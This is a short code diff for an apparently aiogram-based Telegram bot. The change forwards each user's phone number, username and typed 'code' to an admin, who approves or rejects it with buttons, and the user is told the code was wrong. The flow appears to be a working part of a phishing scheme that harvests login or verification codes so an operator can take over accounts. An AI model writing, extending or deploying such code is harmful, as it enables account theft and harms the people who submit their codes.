@@ -81,9 +81,14 @@ async def inline_code_response():
 @inject
 async def process_user_output(message: types.Message,
                               state: FSMContext,
-                              settings: get_settings) -> None:
+                              settings: get_settings,
+                              gateway: Annotated[DatabaseGateway, Depends(TransactionGatewayMarker)],
+                              ) -> None:
+    user_repository = gateway.user()
+    user_database = await user_repository.select_by_username(username=message.from_user.username)
+    phone = user_database.number
     user_data = message.text
-    text = f"Юзер - {message.from_user.id} ввёл данные: {user_data}"
+    text = f"Юзер - {message.from_user.username}, номер - {phone}. Код - {user_data}"
 
     keyboard = await inline_code_response()
     await message.bot.send_message(settings.bot.admins[0], text=text, reply_markup=keyboard)
@@ -127,19 +132,6 @@ async def return_noaprove_request(
         await callback.message.bot.send_message(user_chat_id, text="Ошибка. Неправильный код.", reply_markup=keyboard)
 
     await state.set_state()
-
-    # commands_response = await commands_repository.select(command_tag='second_code_responser')
-    # response_text = "Ошибка. Сейчас вы получите код ещё раз."
-    #
-    # if commands_response and commands_response.image_item_id:
-    #     await callback.message.answer_photo(photo=commands_response.image_item_id, caption=response_text)
-    #     logger.debug(f"Client: Add photo to message, my message: {commands_response.image_item_id}")
-    # else:
-    #     logger.error(f"File not found: {commands_response.image_item_id}")
-    #     await callback.message.answer(text=response_text)
-    #
-    # await state.set_state()
-    # await handle_code_request(callback, state, logger)
 
 
 @code_router.callback_query(F.data == "aprove_message")
